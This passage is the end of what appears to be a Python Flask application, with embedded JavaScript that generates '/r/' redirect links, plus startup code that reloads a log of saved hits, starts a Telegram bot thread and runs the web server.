function genLink(){var n=document.getElementById("name").value.trim();if(!n)return;
var u=d.base_url.replace(/\\/$/,"")+"/r/"+n;var a=document.getElementById("out");
a.href=u;a.textContent=u;a.style.display="inline-block";}
setInterval(load,5000);load();
</script></div></body></html>"""

# ── startup ──────────────────────────────────────────────────
_replay_log()          # reload saved hits (also runs under gunicorn)
_maybe_start_bot()     # Telegram bot thread (also runs under gunicorn)

if __name__ == "__main__":
    port = int(os.getenv("PORT", "5000"))
    app.run(host="0.0.0.0", port=port, threaded=True)
